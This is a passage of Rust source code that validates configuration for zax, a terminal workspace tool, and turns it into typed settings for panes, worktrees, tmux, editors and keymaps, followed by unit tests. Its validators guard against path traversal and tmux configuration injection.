//! Turning the merged TOML into domain types. Validation happens here, once, at
//! the boundary, so nothing downstream re-checks it.

use std::path::PathBuf;

use zax_domain::{
    parse_duration, BuiltinPane, Command, KeyCommand, KeySequence, Keymaps, LayoutSpec,
    PaneContext, PaneKind, PaneSize, PaneSpec, PrFilter, ProjectPaths, Projects, ProjectsRoot,
    RepoPattern, RepoSlug, TodoFile, WorktreeRoot,
};

use crate::error::ConfigError;
use crate::raw::{
    RawConfig, RawEditor, RawKeymap, RawOpen, RawPane, RawProjects, RawPrs, RawTickets, RawTodo,
};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    pub layout: LayoutSpec,
    pub worktree: WorktreeConfig,
    pub tmux: TmuxConfig,
    pub prs: PrFilter,
    pub open: OpenConfig,
    pub editor: EditorConfig,
    pub tickets: TicketsConfig,
    pub todo: TodoConfig,
    /// Where to find the base checkout of a repository other than the one a
    /// session started in. `None` means the feature is off - no `projects.root`
    /// was set, in the global layer that alone may set it.
    pub projects: Option<Projects>,
    /// Every pane's key bindings: the defaults, then the `[keymap]` overrides.
    pub keymaps: Keymaps,
    /// Things worth saying about the config that are not errors, such as a
    /// key whose meaning has changed. `zax doctor` prints them.
    pub notices: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorktreeConfig {
    pub root: WorktreeRoot,
    /// Paths relative to the main working tree.
    pub copy: Vec<PathBuf>,
    pub hooks: Vec<Command>,
}

/// What a worktree is opened in: the tickets pane's `SPC w o`, and `zax worktree
/// new` and `review` once the worktree is ready.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum OpenConfig {
    /// Run the command with the worktree's path appended. `None` when nothing
    /// should be opened at all. A command with no program is not a command,
    /// so the absence is the type rather than a separate flag every caller
    /// would have to consult.
    Command(Option<Command>),
    /// Focus the herdr space that has the worktree open, or open one.
    Herdr,
}

/// What a single file is edited in: the todo pane's `SPC o f`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EditorConfig {
    /// Run the command with the file's path appended; `None` edits nothing.
    Command(Option<Command>),
    /// Run the command on the file in a herdr space of its own. Never empty:
    /// a space with nothing running in it is not an editor.
    Herdr(Command),
}

/// Which ticket provider the tickets pane runs. A layer-2 provider is a
/// command the repository runs, like its panes and hooks, except that it is
/// run by the shared per-user broker, outside the repository's session. A
/// relative program path is anchored at the repository's main worktree
/// before it reaches the broker.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TicketsConfig {
    pub provider: Option<Command>,
}

/// Where the todo pane's file is. `None` means the default under the data
/// home, which depends on the environment and so is the composition root's
/// to resolve.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TodoConfig {
    pub file: Option<TodoFile>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TmuxConfig {
    pub prefix: String,
}

const DEFAULT_AGENT: &str = "claude";
const DEFAULT_WORKTREE_ROOT: &str = "~/src/worktrees";
const DEFAULT_PREFIX: &str = "C-Space";
/// zax is the Zed agent terminal, so a new worktree opens in Zed. `-e` is the
/// flag Zed's own CLI takes for "open this path".
const DEFAULT_EDITOR: [&str; 2] = ["zed", "-e"];
/// A herdr space is a terminal, so the editor run in it is a terminal one.
const DEFAULT_HERDR_EDITOR: [&str; 1] = ["nvim"];

/// The ways `open` and `editor` can hand a path on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Via {
    Command,
    Herdr,
}

const VIA_CHOICES: &str = "command, herdr";

/// `home` is the value `~` expands to. It is a parameter rather than a lookup so
/// this function stays pure and testable.
pub fn from_raw(raw: RawConfig, home: &str) -> Result<Config, ConfigError> {
    // An empty list is no agent at all, as an empty command is elsewhere in
    // this file: the panes are then the whole session.
    let agent = optional_command(
        raw.agent.and_then(|a| a.command),
        &[DEFAULT_AGENT],
        "agent.command",
    )?;

    let panes = match raw.layout.and_then(|l| l.panes) {
        Some(raw_panes) => raw_panes
            .into_iter()
            .map(pane_from_raw)
            .collect::<Result<Vec<_>, _>>()?,
        None => default_panes()?,
    };

    let layout = match agent {
        Some(agent) => LayoutSpec::new(agent, panes),
        None => {
            let mut panes = panes.into_iter();
            let first = panes.next().ok_or_else(|| ConfigError::Invalid {
                field: "agent.command",
                detail: "is empty, so the panes are the whole session, but layout.panes has none"
                    .to_owned(),
            })?;
            LayoutSpec::panes_only(first, panes.collect())
        }
    };

    let raw_worktree = raw.worktree.unwrap_or_default();
    let root_text = raw_worktree
        .root
        .unwrap_or_else(|| DEFAULT_WORKTREE_ROOT.to_owned());
    let expanded = expand_home(&root_text, home);
    let root = WorktreeRoot::new(PathBuf::from(expanded)).map_err(|e| ConfigError::Invalid {
        field: "worktree.root",
        detail: e.to_string(),
    })?;

    let copy = raw_worktree
        .copy
        .unwrap_or_default()
        .into_iter()
        .map(|entry| {
            validate_copy_entry(&entry).map_err(|detail| ConfigError::Invalid {
                field: "worktree.copy",
                detail,
            })?;
            Ok(PathBuf::from(entry))
        })
        .collect::<Result<Vec<_>, ConfigError>>()?;

    let hooks = raw_worktree
        .hooks
        .unwrap_or_default()
        .iter()
        .map(|script| {
            Command::shell(script).map_err(|e| ConfigError::Invalid {
                field: "worktree.hooks",
                detail: e.to_string(),
            })
        })
        .collect::<Result<Vec<_>, _>>()?;

    let prefix = raw
        .tmux
        .and_then(|t| t.prefix)
        .unwrap_or_else(|| DEFAULT_PREFIX.to_owned());
    validate_prefix(&prefix).map_err(|detail| ConfigError::Invalid {
        field: "tmux.prefix",
        detail,
    })?;

    let prs = prs_filter_from_raw(raw.prs.unwrap_or_default())?;
    let notices = migration_notices(raw.open.as_ref(), raw.editor.as_ref());
    let open = open_from_raw(raw.open.unwrap_or_default())?;
    let editor = editor_from_raw(raw.editor.unwrap_or_default())?;
    let tickets = tickets_from_raw(raw.tickets.unwrap_or_default())?;
    let todo = todo_from_raw(raw.todo.unwrap_or_default(), home)?;
    let projects = projects_from_raw(raw.projects, home)?;
    let keymaps = keymaps_from_raw(raw.keymap.unwrap_or_default())?;

    Ok(Config {
        layout,
        worktree: WorktreeConfig { root, copy, hooks },
        tmux: TmuxConfig { prefix },
        prs,
        open,
        editor,
        tickets,
        todo,
        projects,
        keymaps,
        notices,
    })
}

/// Defaults (unless switched off), then `all`, then each context's table. Every
/// entry unbinds its sequence before binding, so an override replaces rather
/// than conflicts. `all` quietly skips panes that lack the command, leaving
/// whatever they had bound; a context table naming one is an error.
fn keymaps_from_raw(raw: RawKeymap) -> Result<Keymaps, ConfigError> {
    let mut contexts = Vec::new();
    let mut all = None;
    for (name, entries) in &raw.tables {
        if name == "all" {
            all = Some(entries);
        } else {
            let context = name
                .parse::<PaneContext>()
                .map_err(|_| ConfigError::UnknownKeymapTable(name.clone()))?;
            contexts.push((name.as_str(), context, entries));
        }
    }

    let mut keymaps = if raw.defaults.unwrap_or(true) {
        Keymaps::defaults()
    } else {
        Keymaps::empty()
    };

    // Within each phase the `"none"` entries run first. Entries are visited in
    // key order, so `"SPC d"` would otherwise always be bound before the
    // `"SPC d d" = "none"` that clears the way for it.
    let all_entries = keymap_entries("all", all.into_iter().flatten())?;
    for (sequence, seq, command) in phase_order(&all_entries) {
        for context in PaneContext::ALL {
            match command {
                None => {
                    keymaps.unbind(context, seq);
                }
                Some(command) if context.supports(command) => {
                    keymaps.unbind(context, seq);
                    keymaps
                        .bind(context, seq, command)
                        .map_err(|e| keymap_error("all", sequence, e))?;
                }
                Some(_) => {}
            }
        }
    }

    for (table, context, entries) in contexts {
        let entries = keymap_entries(table, entries)?;
        for (sequence, seq, command) in phase_order(&entries) {
            keymaps.unbind(context, seq);
            if let Some(command) = command {
                keymaps
                    .bind(context, seq, command)
                    .map_err(|e| keymap_error(table, sequence, e))?;
            }
        }
    }
    Ok(keymaps)
}

type KeymapEntry<'a> = (&'a str, KeySequence, Option<KeyCommand>);

fn keymap_entries<'a>(
    table: &str,
    entries: impl IntoIterator<Item = (&'a String, &'a String)>,
) -> Result<Vec<KeymapEntry<'a>>, ConfigError> {
    entries
        .into_iter()
        .map(|(sequence, command)| {
            let (seq, command) = keymap_entry(table, sequence, command)?;
            Ok((sequence.as_str(), seq, command))
        })
        .collect()
}

/// The entries with every unbind ahead of every bind.
fn phase_order<'a>(
    entries: &'a [KeymapEntry<'a>],
) -> impl Iterator<Item = (&'a str, &'a KeySequence, Option<KeyCommand>)> {
    let none = entries.iter().filter(|(_, _, c)| c.is_none());
    let binds = entries.iter().filter(|(_, _, c)| c.is_some());
    none.chain(binds).map(|(s, seq, c)| (*s, seq, *c))
}

/// `None` is the `"none"` command: unbind the sequence.
fn keymap_entry(
    table: &str,
    sequence: &str,
    command: &str,
) -> Result<(KeySequence, Option<KeyCommand>), ConfigError> {
    let seq = KeySequence::parse(sequence).map_err(|e| keymap_error(table, sequence, e))?;
    if command == "none" {
        return Ok((seq, None));
    }
    let command = command
        .parse::<KeyCommand>()
        .map_err(|e| keymap_error(table, sequence, e))?;
    Ok((seq, Some(command)))
}

fn keymap_error(table: &str, sequence: &str, detail: impl std::fmt::Display) -> ConfigError {
    ConfigError::Keymap {
        table: table.to_owned(),
        sequence: sequence.to_owned(),
        detail: detail.to_string(),
    }
}

/// An absent `root` is the feature off - and `paths` has nothing to override
/// in that case, so it is refused rather than silently ignored.
fn projects_from_raw(
    raw: Option<RawProjects>,
    home: &str,
) -> Result<Option<Projects>, ConfigError> {
    let Some(raw) = raw else { return Ok(None) };
    let Some(root_text) = raw.root else {
        return match raw.paths {
            None => Ok(None),
            Some(_) => Err(ConfigError::Invalid {
                field: "projects.paths",
                detail: "needs projects.root; without it the projects feature is off".to_owned(),
            }),
        };
    };

    let root = ProjectsRoot::new(PathBuf::from(expand_home(&root_text, home))).map_err(|e| {
        ConfigError::Invalid {
            field: "projects.root",
            detail: e.to_string(),
        }
    })?;

    let entries = raw
        .paths
        .unwrap_or_default()
        .into_iter()
        .map(|(key, value)| {
            let slug = RepoSlug::parse(&key).map_err(|e| ConfigError::Invalid {
                field: "projects.paths",
                detail: e.to_string(),
            })?;
            Ok((slug, PathBuf::from(expand_home(&value, home))))
        })
        .collect::<Result<Vec<_>, ConfigError>>()?;

    let paths = ProjectPaths::new(entries).map_err(|e| ConfigError::Invalid {
        field: "projects.paths",
        detail: e.to_string(),
    })?;

    Ok(Some(Projects { root, paths }))
}

fn todo_from_raw(raw: RawTodo, home: &str) -> Result<TodoConfig, ConfigError> {
    let invalid = |detail: String| ConfigError::Invalid {
        field: "todo.file",
        detail,
    };
    match raw.file {
        None => Ok(TodoConfig { file: None }),
        Some(text) if text.trim().is_empty() => Err(invalid("is empty".to_owned())),
        Some(text) => TodoFile::new(PathBuf::from(expand_home(&text, home)))
            .map(|file| TodoConfig { file: Some(file) })
            .map_err(|e| invalid(e.to_string())),
    }
}

/// An absent table and an empty list both mean no provider, so the pane has
/// nothing to run and says so.
fn tickets_from_raw(raw: RawTickets) -> Result<TicketsConfig, ConfigError> {
    match raw.provider {
        None => Ok(TicketsConfig { provider: None }),
        Some(argv) if argv.is_empty() => Ok(TicketsConfig { provider: None }),
        Some(argv) => Command::new(argv)
            .map(|c| TicketsConfig { provider: Some(c) })
            .map_err(|e| ConfigError::Invalid {
                field: "tickets.provider",
                detail: e.to_string(),
            }),
    }
}

fn via_from_raw(raw: Option<&str>, field: &'static str) -> Result<Via, ConfigError> {
    match raw {
        None | Some("command") => Ok(Via::Command),
        Some("herdr") => Ok(Via::Herdr),
        Some(other) => Err(ConfigError::Invalid {
            field,
            detail: format!("`{other}` is not one of {VIA_CHOICES}"),
        }),
    }
}

fn default_argv(argv: &[&str]) -> Vec<String> {
    argv.iter().map(|s| (*s).to_owned()).collect()
}

/// An absent list is the default; an empty one is no command at all.
fn optional_command(
    argv: Option<Vec<String>>,
    default: &[&str],
    field: &'static str,
) -> Result<Option<Command>, ConfigError> {
    let argv = argv.unwrap_or_else(|| default_argv(default));
    if argv.is_empty() {
        return Ok(None);
    }
    Command::new(argv)
        .map(Some)
        .map_err(|e| ConfigError::Invalid {
            field,
            detail: e.to_string(),
        })
}

/// An absent table opens Zed; an empty list opens nothing. Only a list with a
/// program in it has to be checked, and it is checked here so nothing that
/// holds an `OpenConfig` afterwards asks again. Through herdr the command is
/// not used: herdr opens the worktree as a space of its own.
fn open_from_raw(raw: RawOpen) -> Result<OpenConfig, ConfigError> {
    match via_from_raw(raw.via.as_deref(), "open.via")? {
        Via::Command => {
            optional_command(raw.command, &DEFAULT_EDITOR, "open.command").map(OpenConfig::Command)
        }
        Via::Herdr => Ok(OpenConfig::Herdr),
    }
}

fn editor_from_raw(raw: RawEditor) -> Result<EditorConfig, ConfigError> {
    match via_from_raw(raw.via.as_deref(), "editor.via")? {
        Via::Command => optional_command(raw.command, &DEFAULT_EDITOR, "editor.command")
            .map(EditorConfig::Command),
        Via::Herdr => {
            match optional_command(raw.command, &DEFAULT_HERDR_EDITOR, "editor.command")? {
                Some(command) => Ok(EditorConfig::Herdr(command)),
                None => Err(ConfigError::Invalid {
                    field: "editor.command",
                    detail: "herdr runs this command on the file in a space of its own, \
                             so it cannot be empty"
                        .to_owned(),
                }),
            }
        }
    }
}

/// `[editor] command` used to be what a worktree opened in. A config that
/// still says so and has no `[open]` table would quietly start opening
/// worktrees in Zed, so that is worth a line.
fn migration_notices(open: Option<&RawOpen>, editor: Option<&RawEditor>) -> Vec<String> {
    let custom_editor = editor
        .and_then(|e| e.command.as_ref())
        .is_some_and(|argv| *argv != default_argv(&DEFAULT_EDITOR));
    if open.is_none() && custom_editor {
        return vec![
            "`[editor] command` now only edits files, such as the todo pane's `SPC o f`; \
             worktrees open in `[open] command`, which defaults to `zed -e`"
                .to_owned(),
        ];
    }
    Vec::new()
}

fn prs_filter_from_raw(raw: RawPrs) -> Result<PrFilter, ConfigError> {
    let patterns = |list: Option<Vec<String>>, field: &'static str| {
        list.unwrap_or_default()
            .iter()
            .map(|entry| {
                RepoPattern::parse(entry).map_err(|e| ConfigError::Invalid {
                    field,
                    detail: e.to_string(),
                })
            })
            .collect::<Result<Vec<_>, _>>()
    };

    let max_age = raw
        .max_age
        .map(|text| {
            parse_duration(&text).map_err(|e| ConfigError::Invalid {
                field: "prs.max_age",
                detail: e.to_string(),
            })
        })
        .transpose()?;

    Ok(PrFilter {
        include: patterns(raw.include, "prs.include")?,
        exclude: patterns(raw.exclude, "prs.exclude")?,
        max_age,
    })
}

/// A `copy` entry is joined onto both the source repository and the new
/// worktree, so it decides two paths from one relative string.
///
/// A `..` component escapes both: it reads a file from outside the repository
/// and writes it outside the worktree. An absolute entry is worse, because
/// `Path::join` discards the base entirely and the entry becomes the whole
/// path on each side. Neither can be what a `copy` list means, and the layer
/// that usually writes this one is the repository's own checked-in config.
fn validate_copy_entry(entry: &str) -> Result<(), String> {
    use std::path::Component;

    if entry.is_empty() {
        return Err("an entry is empty; every entry is a path inside the repository".to_owned());
    }
    let path = std::path::Path::new(entry);
    for component in path.components() {
        match component {
            Component::Normal(_) | Component::CurDir => {}
            Component::ParentDir => {
                return Err(format!("`{entry}` leaves the repository with a `..`"))
            }
            Component::RootDir | Component::Prefix(_) => {
                return Err(format!(
                    "`{entry}` is absolute; entries are relative to the repository"
                ))
            }
        }
    }
    Ok(())
}

/// The prefix is substituted into zax's generated tmux configuration as text.
///
/// A newline in it therefore writes further configuration lines, `run-shell`
/// among them, which turns a key-name setting into arbitrary commands at server
/// start. Every control character is refused, not only the newline: none of
/// them can appear in a tmux key name, so nothing legitimate is lost and there
/// is no second spelling to find later.
fn validate_prefix(prefix: &str) -> Result<(), String> {
    if prefix.is_empty() {
        return Err("the prefix is empty".to_owned());
    }
    if prefix.chars().any(char::is_control) {
        return Err(format!(
            "`{}` contains a control character; a prefix is a tmux key name such \
             as C-Space, and anything else would be written into zax's tmux \
             configuration as further lines",
            prefix.escape_debug()
        ));
    }
    Ok(())
}

/// With no configured layout, all three built-ins are shown.
///
/// The sizes are relative - each is a share of the pane it splits - so they
/// read oddly until the chain is walked. 30% is the context column's width.
/// Then 55% leaves `prs-for-review` 45% of the column's height, and 64% of
/// that 55% gives `my-prs` 35% and leaves `branch-status` 20%. The review
/// queue is widest because it is what other people are waiting on, `my-prs`
/// next, and `branch-status` smallest because a branch, its ahead/behind and
/// its checks are a handful of lines.
pub(crate) fn default_panes() -> Result<Vec<PaneSpec>, ConfigError> {
    let size = |v: u8| {
        PaneSize::percent(v).map_err(|e| ConfigError::Invalid {
            field: "layout.panes.size",
            detail: e.to_string(),
        })
    };
    Ok(vec![
        PaneSpec {
            kind: PaneKind::Builtin(BuiltinPane::PrsForReview),
            size: Some(size(30)?),
        },
        PaneSpec {
            kind: PaneKind::Builtin(BuiltinPane::BranchStatus),
            size: Some(size(55)?),
        },
        PaneSpec {
            kind: PaneKind::Builtin(BuiltinPane::MyPrs),
            size: Some(size(64)?),
        },
    ])
}

/// Turn one `[[layout.panes]]` table into a pane.
///
/// serde has already refused any field this file does not know about. What is
/// left is whether the fields present suit the `kind` that was asked for, which
/// serde cannot express for a flat table, and which is checked here so the
/// error can name both the kind and the field.
fn pane_from_raw(raw: RawPane) -> Result<PaneSpec, ConfigError> {
    let size = parse_size(raw.size)?;

    let kind = match raw.kind.as_str() {
        "builtin" => {
            let name = require(raw.name, "builtin", "name")?;
            reject(raw.title.is_some(), "builtin", "title")?;
            reject(raw.every.is_some(), "builtin", "every")?;
            reject(raw.command.is_some(), "builtin", "command")?;
            PaneKind::Builtin(BuiltinPane::parse(&name).map_err(|e| ConfigError::Invalid {
                field: "layout.panes.name",
                detail: e.to_string(),
            })?)
        }
        "exec" => {
            let title = require(raw.title, "exec", "title")?;
            let every = require(raw.every, "exec", "every")?;
            let command = require(raw.command, "exec", "command")?;
            reject(raw.name.is_some(), "exec", "name")?;
            PaneKind::Exec {
                title,
                every: parse_duration(&every).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.every",
                    detail: e.to_string(),
                })?,
                command: Command::new(command).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.command",
                    detail: e.to_string(),
                })?,
            }
        }
        "raw" => {
            let command = require(raw.command, "raw", "command")?;
            reject(raw.name.is_some(), "raw", "name")?;
            reject(raw.title.is_some(), "raw", "title")?;
            reject(raw.every.is_some(), "raw", "every")?;
            PaneKind::Raw {
                command: Command::new(command).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.command",
                    detail: e.to_string(),
                })?,
            }
        }
        other => return Err(ConfigError::UnknownPaneKind(other.to_owned())),
    };

    Ok(PaneSpec { kind, size })
}

fn require<T>(value: Option<T>, kind: &'static str, field: &'static str) -> Result<T, ConfigError> {
    value.ok_or(ConfigError::MissingPaneField { kind, field })
}

fn reject(present: bool, kind: &'static str, field: &'static str) -> Result<(), ConfigError> {
    if present {
        Err(ConfigError::UnexpectedPaneField { kind, field })
    } else {
        Ok(())
    }
}

/// `"30%"` and `"30"` both mean thirty percent.
fn parse_size(raw: Option<String>) -> Result<Option<PaneSize>, ConfigError> {
    let Some(text) = raw else { return Ok(None) };
    let digits = text.strip_suffix('%').unwrap_or(&text);
    let invalid = |detail: String| ConfigError::Invalid {
        field: "layout.panes.size",
        detail,
    };
    let value: u8 = digits
        .parse()
        .map_err(|_| invalid(format!("`{text}` is not a percentage")))?;
    PaneSize::percent(value)
        .map(Some)
        .map_err(|e| invalid(e.to_string()))
}

fn expand_home(path: &str, home: &str) -> String {
    match path.strip_prefix("~/") {
        Some(rest) => format!("{}/{rest}", home.trim_end_matches('/')),
        None if path == "~" => home.to_owned(),
        None => path.to_owned(),
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing)]
    use std::path::PathBuf;
    use std::time::Duration;

    use zax_domain::{BuiltinPane, PaneKind, RootPane};

    use super::*;
    use crate::raw::RawConfig;

    fn config_from(text: &str) -> Config {
        let raw: RawConfig = toml::from_str(text).unwrap();
        from_raw(raw, "/home/me").unwrap()
    }

    fn keymap_err(text: &str) -> String {
        let raw: RawConfig = toml::from_str(text).unwrap();
        from_raw(raw, "/home/me").unwrap_err().to_string()
    }

    fn seq(text: &str) -> KeySequence {
        KeySequence::parse(text).unwrap()
    }

    #[test]
    fn no_keymap_table_gives_the_default_keymaps() {
        assert_eq!(config_from("").keymaps, Keymaps::defaults());
    }

    #[test]
    fn defaults_false_starts_from_no_bindings() {
        let config = config_from("[keymap]\ndefaults = false\n");
        assert_eq!(config.keymaps, Keymaps::empty());
    }

    #[test]
    fn a_context_binding_replaces_the_default_on_that_sequence() {
        let config = config_from("[keymap.tickets]\n\"SPC r\" = \"copy-url\"\n");
        let tickets = config.keymaps.for_context(PaneContext::Tickets);
        assert_eq!(
            tickets.lookup(seq("SPC r").chords()),
            zax_domain::Lookup::Command(KeyCommand::CopyUrl)
        );
        let mine = config.keymaps.for_context(PaneContext::MyPrs);
        assert_eq!(
            mine.lookup(seq("SPC r").chords()),
            zax_domain::Lookup::Command(KeyCommand::Refresh)
        );
    }

    #[test]
    fn none_unbinds_a_default_sequence() {
        let config = config_from("[keymap.tickets]\n\"SPC s\" = \"none\"\n");
        let tickets = config.keymaps.for_context(PaneContext::Tickets);
        assert_eq!(
            tickets.lookup(seq("SPC s").chords()),
            zax_domain::Lookup::Unbound
        );
    }

    #[test]
    fn all_binds_in_every_pane_that_supports_the_command() {
        let config = config_from("[keymap.all]\n\"SPC g\" = \"copy-url\"\n");
        for context in PaneContext::ALL {
            let found = config
                .keymaps
                .for_context(context)
                .lookup(seq("SPC g").chords());
            if context.supports(KeyCommand::CopyUrl) {
                assert_eq!(found, zax_domain::Lookup::Command(KeyCommand::CopyUrl));
            } else {
                assert_eq!(found, zax_domain::Lookup::Unbound, "{context}");
            }
        }
    }

    #[test]
    fn all_leaves_panes_that_lack_the_command_untouched() {
        let config = config_from("[keymap.all]\n\"x\" = \"copy-url\"\n");
        let todo = config.keymaps.for_context(PaneContext::Todo);
        assert_eq!(
            todo.lookup(seq("x").chords()),
            zax_domain::Lookup::Command(KeyCommand::TodoToggle)
        );
        let prs = config.keymaps.for_context(PaneContext::PrsForReview);
        assert_eq!(
            prs.lookup(seq("x").chords()),
            zax_domain::Lookup::Command(KeyCommand::CopyUrl)
        );
    }

    #[test]
    fn a_single_key_can_replace_a_group_in_a_context_table() {
        let config =
            config_from("[keymap.todo]\n\"SPC d\" = \"todo-delete\"\n\"SPC d d\" = \"none\"\n");
        let todo = config.keymaps.for_context(PaneContext::Todo);
        assert_eq!(
            todo.lookup(seq("SPC d").chords()),
            zax_domain::Lookup::Command(KeyCommand::TodoDelete)
        );
    }

    #[test]
    fn a_single_key_can_replace_a_group_in_tickets() {
        let config = config_from(
            "[keymap.tickets]\n\"SPC w\" = \"worktree-open\"\n\"SPC w o\" = \"none\"\n\"SPC w l\" = \"none\"\n",
        );
        let tickets = config.keymaps.for_context(PaneContext::Tickets);
        assert_eq!(
            tickets.lookup(seq("SPC w").chords()),
            zax_domain::Lookup::Command(KeyCommand::WorktreeOpen)
        );
    }

    #[test]
    fn an_esc_after_a_prefix_is_a_config_error_naming_the_key() {
        let err = keymap_err("[keymap.todo]\n\"SPC <Esc>\" = \"refresh\"\n");
        assert!(err.contains("keymap.todo.\"SPC <Esc>\""), "{err}");
    }

    #[test]
    fn a_context_table_overrides_all() {
        let config = config_from(
            "[keymap.all]\n\"SPC g\" = \"refresh\"\n[keymap.todo]\n\"SPC g\" = \"todo-add\"\n",
        );
        let todo = config.keymaps.for_context(PaneContext::Todo);
        assert_eq!(
            todo.lookup(seq("SPC g").chords()),
            zax_domain::Lookup::Command(KeyCommand::TodoAdd)
        );
    }

    #[test]
    fn a_keymap_error_names_the_table_and_the_sequence() {
        let unknown_command = keymap_err("[keymap.tickets]\n\"SPC g\" = \"explode\"\n");
        assert!(
            unknown_command.contains("keymap.tickets.\"SPC g\""),
            "{unknown_command}"
        );

        let unknown_table = keymap_err("[keymap.nowhere]\n\"SPC g\" = \"refresh\"\n");
        assert!(unknown_table.contains("keymap.nowhere"), "{unknown_table}");

        let unsupported = keymap_err("[keymap.exec]\n\"SPC g\" = \"copy-url\"\n");
        assert!(
            unsupported.contains("keymap.exec.\"SPC g\""),
            "{unsupported}"
        );

        let bad_sequence = keymap_err("[keymap.todo]\n\"SPC <wat>\" = \"refresh\"\n");
        assert!(
            bad_sequence.contains("keymap.todo.\"SPC <wat>\""),
            "{bad_sequence}"
        );

        let conflict = keymap_err("[keymap.todo]\n\"SPC d\" = \"refresh\"\n");
        assert!(conflict.contains("keymap.todo.\"SPC d\""), "{conflict}");

        let in_all = keymap_err("[keymap.all]\n\"SPC q x\" = \"refresh\"\n");
        assert!(in_all.contains("keymap.all.\"SPC q x\""), "{in_all}");
    }

    #[test]
    fn a_later_layer_wins_per_sequence() {
        let layer = |text: &str| toml::from_str::<RawConfig>(text).unwrap();
        let merged = crate::merge::merge(vec![
            layer("[keymap.tickets]\n\"SPC g\" = \"refresh\"\n\"SPC h\" = \"copy-url\"\n"),
            layer("[keymap]\ndefaults = false\n[keymap.tickets]\n\"SPC  g\" = \"open\"\n"),
        ]);
        let config = from_raw(merged, "/h").unwrap();
        let tickets = config.keymaps.for_context(PaneContext::Tickets);
        assert_eq!(
            tickets.lookup(seq("SPC g").chords()),
            zax_domain::Lookup::Command(KeyCommand::Open)
        );
        assert_eq!(
            tickets.lookup(seq("SPC h").chords()),
            zax_domain::Lookup::Command(KeyCommand::CopyUrl)
        );
        assert_eq!(
            tickets.lookup(seq("SPC q").chords()),
            zax_domain::Lookup::Unbound
        );
    }

    #[test]
    fn no_todo_table_leaves_the_file_to_the_default() {
        assert_eq!(config_from("").todo.file, None);
    }

    #[test]
    fn a_todo_file_expands_home() {
        let config = config_from("[todo]\nfile = \"~/notes/todo.md\"");
        assert_eq!(
            config.todo.file.unwrap().as_path(),
            std::path::Path::new("/home/me/notes/todo.md")
        );
    }

    #[test]
    fn a_relative_or_empty_todo_file_is_refused() {
        for text in ["[todo]\nfile = \"todo.md\"", "[todo]\nfile = \"\""] {
            let raw: RawConfig = toml::from_str(text).unwrap();
            let err = from_raw(raw, "/home/me").unwrap_err();
            assert!(err.to_string().contains("todo.file"), "{err}");
        }
    }

    #[test]
    fn an_unknown_todo_key_is_an_error() {
        assert!(toml::from_str::<RawConfig>("[todo]\npath = \"/a\"").is_err());
    }

    #[test]
    fn no_tickets_table_means_no_provider() {
        assert_eq!(config_from("").tickets.provider, None);
    }

    #[test]
    fn a_tickets_provider_is_a_command() {
        let config = config_from("[tickets]\nprovider = [\"zax-jira\"]");
        assert_eq!(config.tickets.provider.unwrap().argv(), ["zax-jira"]);
    }

    #[test]
    fn an_empty_tickets_provider_turns_it_off() {
        assert_eq!(
            config_from("[tickets]\nprovider = []").tickets.provider,
            None
        );
    }

    #[test]
    fn an_empty_agent_command_makes_the_panes_the_whole_session() {
        let config = config_from(
            "[agent]\ncommand = []\n\n[[layout.panes]]\nkind = \"builtin\"\nname = \"todo\"\nsize = \"30%\"\n\n[[layout.panes]]\nkind = \"builtin\"\nname = \"tickets\"\nsize = \"80%\"",
        );
        assert_eq!(config.layout.agent(), None);
        assert_eq!(
            config.layout.root(),
            &RootPane::Context(PaneKind::Builtin(BuiltinPane::Todo))
        );
        assert_eq!(config.layout.panes().len(), 1);
        assert_eq!(
            config.layout.panes()[0].kind,
            PaneKind::Builtin(BuiltinPane::Tickets)
        );
    }

    #[test]
    fn no_agent_and_no_panes_is_refused() {
        let raw: RawConfig = toml::from_str("[agent]\ncommand = []\n[layout]\npanes = []").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err().to_string();
        assert!(err.contains("agent.command"), "got: {err}");
        assert!(err.contains("layout.panes"), "got: {err}");
    }

    #[test]
    fn an_empty_config_yields_the_documented_defaults() {
        let config = config_from("");
        assert_eq!(config.layout.agent().unwrap().argv(), ["claude"]);
        assert_eq!(config.layout.panes().len(), 3);
        assert_eq!(
            config.layout.panes()[0].kind,
            PaneKind::Builtin(BuiltinPane::PrsForReview)
        );
        assert_eq!(
            config.layout.panes()[1].kind,
            PaneKind::Builtin(BuiltinPane::BranchStatus)
        );
        assert_eq!(
            config.layout.panes()[2].kind,
            PaneKind::Builtin(BuiltinPane::MyPrs)
        );
        assert_eq!(
            config.worktree.root.as_path(),
            std::path::Path::new("/home/me/src/worktrees")
        );
        assert!(config.worktree.copy.is_empty());
        assert!(config.worktree.hooks.is_empty());
        assert_eq!(config.tmux.prefix, "C-Space");
    }

    fn argv(command: &Command) -> Vec<&str> {
        command.argv().iter().map(String::as_str).collect()
    }

    fn err_from(text: &str) -> String {
        let raw: RawConfig = toml::from_str(text).unwrap();
        from_raw(raw, "/home/me").unwrap_err().to_string()
    }

    #[test]
    fn no_open_table_opens_the_worktree_in_zed() {
        // zax exists to sit beside Zed, so the editor it opens a new worktree
        // in is the one you are already in unless you say otherwise.
        let OpenConfig::Command(Some(command)) = config_from("").open else {
            panic!("expected a command opener");
        };
        assert_eq!(argv(&command), ["zed", "-e"]);
    }

    #[test]
    fn an_open_command_replaces_the_default_argv_entirely() {
        let config = config_from("[open]\ncommand = [\"code\", \"--new-window\"]");
        let OpenConfig::Command(Some(command)) = config.open else {
            panic!("expected a command opener");
        };
        assert_eq!(argv(&command), ["code", "--new-window"]);
    }

    #[test]
    fn an_empty_open_command_is_how_you_turn_opening_off() {
        // There is no separate on/off key: a command with no program is the
        // absence of a command, and the type says so rather than a flag some
        // later caller has to remember to consult.
        assert_eq!(
            config_from("[open]\ncommand = []").open,
            OpenConfig::Command(None)
        );
    }

    #[test]
    fn opening_through_herdr_needs_no_command() {
        assert_eq!(
            config_from("[open]\nvia = \"herdr\"").open,
            OpenConfig::Herdr
        );
    }

    #[test]
    fn no_editor_table_edits_in_zed() {
